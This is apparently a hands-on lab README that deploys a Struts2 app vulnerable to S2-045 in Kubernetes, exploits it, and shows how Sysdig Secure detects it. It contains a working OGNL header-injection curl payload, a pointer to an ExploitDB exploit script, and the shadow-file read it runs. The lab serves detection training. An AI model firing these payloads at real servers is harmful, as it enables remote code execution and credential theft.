# Vulnerable Struts2 (S2-045) Lab 🧪 🔬 

In this lab, you will deploy a Vulnerable Struts2 workload (S2-045 / CVE-2017-5638) in Kubernetes.

1. **Confirm** you can reach the vulnerable app.  
2. **Exploit** it using a simple malicious payload.  
3. **Observe** detection events in Sysdig Secure.

----------

## 1. Access the Struts2 Application 🤖 

-  Your environment can be deployed using the `setup_struts_deployment.sh` file and a pre-configured cluster hosting the Sysdig Detection Agent.  

-  The application will expose on **NodePort 30080**.  

-  Go to `http://localhost:30080` in a browser or use curl:
 
   curl -v http://localhost:30080

-  If properly configured - You should recieve a simple file upload form!

-----------

## 2. Exploit 🦠 

- **Trigger the RCE** by issuing and analyzing the output of: 

`curl -v -X POST -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',668.5*2)}.multipart/form-data" http://localhost:30080`

- Alternatively you may use ExploitDB's python exploit @ `https://www.exploit-db.com/exploits/41570`
  Usage: `python2 <script> <url> <command>`

-----------

## 3. **Detection** 🔍 

A clear distinction must be made between an OGNL payload that stays within Java’s memory (e.g., returning 1337 in a custom header) and one that spawns a system-level process (e.g., cat /etc/shadow).

### Header Injection 
The payload executes in Struts memory, returning **1337** via the vulhub **header**.
No new process, no file access, and no unusual network connections occur.
Sysdig (or any runtime analysis) does not flag this as malicious because it sees no suspicious system calls.


### Python Script (Spawning a Process)
The payload calls `cat /etc/shadow`, causing Java to execute a new child process.
Sysdig sees `/bin/cat /etc/shadow` and raises a **Medium** severity alert because it recognizes unexpected process execution attemtpting to access a sensitive file.

Verify in Sysdig Secure:
Go to **Threats → Sysdig Runtime Notable Events**.
Find the corresponding Event ID (e.g., 18191e49f34866df273474732a500c25).
In summary, a simple header injection won’t trigger Sysdig, but any payload that spawns a process or accesses sensitive resources will. This showcases early detection and the need for refined rulesets within your tools!



